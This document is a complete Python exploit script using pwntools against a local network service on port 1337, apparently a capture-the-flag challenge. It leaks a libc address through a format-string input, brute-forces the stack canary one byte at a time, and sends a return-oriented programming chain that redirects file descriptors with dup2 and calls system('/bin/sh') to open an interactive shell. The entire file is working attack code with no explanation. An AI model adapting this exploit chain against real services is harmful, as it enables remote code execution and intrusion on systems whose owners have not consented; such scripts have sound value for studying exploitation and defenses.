#!/usr/bin/python3
from pwn import remote, p64, p8, log, context

def leak_libc(shell):
    shell.sendlineafter(b"=> ", b"A" * 16)
    shell.recvline_contains(b"=> ")
    shell.sendlineafter(b"=> ", b"6")
    shell.sendlineafter(b"=> ", b"1")
    shell.sendlineafter(b"=> ", b"%2$p")
    shell.recvline_contains(b"=> ")
    shell.sendlineafter(b"=> ", b"5")
    shell.recvuntil(b"for ")

    libc_base = int(shell.recvline().strip(), 16) - 0x11491b

    shell.sendlineafter(b"=> ", b"2")
    shell.sendlineafter(b"=> ", b"A" * 0xff)
    shell.sendlineafter(b"=> ", b"y")

    return libc_base

def bruteforce():
    bar = log.progress("Canary")
    value = b""

    while len(value) < 8:
        for byte in range(256):
            with context.local(log_level = "error"):
                shell = remote("127.0.0.1", 1337)

            leak_libc(shell)
            current = value + p8(byte)

            shell.sendafter(b"=> ", b"A" * 8 + current)
            shell.recvline()

            bar.status("0x" + current[::-1].hex().rjust(16, "-"))

            try:
                if b"+-" in shell.recvline(timeout=0.5):
                    value = current
                    break

            except EOFError:
                pass

            finally:
                with context.local(log_level = "error"):
                    shell.close()

    bar.success("0x" + value[::-1].hex())
    return value

canary = bruteforce()

shell = remote("127.0.0.1", 1337)
libc_base = leak_libc(shell)

payload  = b""
payload += b"A" * 8                  # padding
payload += canary                    # stack cookie
payload += b"B" * 8                  # $rbp value

payload += p64(libc_base + 0x02a3e5) # pop rdi; ret;
payload += p64(0x4)                  # descriptor

for i in range(0, 3):
    payload += p64(libc_base + 0x02be51) # pop rsi; ret;
    payload += p64(i)                    # std
    payload += p64(libc_base + 0x115010) # dup2()

payload += p64(libc_base + 0x02a3e5) # pop rdi; ret;
payload += p64(libc_base + 0x1d8678) # "/bin/sh"
payload += p64(libc_base + 0x050d70) # system()

shell.sendafter(b"=> ", payload)
shell.recvline()
shell.interactive()
